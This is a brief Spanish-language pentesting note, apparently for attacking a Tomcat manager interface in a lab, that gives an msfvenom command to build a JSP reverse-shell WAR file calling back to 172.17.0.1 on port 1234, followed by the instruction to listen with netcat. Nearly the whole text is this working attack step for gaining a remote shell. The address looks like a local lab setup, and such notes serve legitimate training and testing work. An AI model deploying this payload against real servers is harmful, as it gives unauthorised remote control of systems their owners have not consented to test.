## Con manager

Crear Payload:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=1234 -f war -o revshell.war
```

Escuchar en netcat
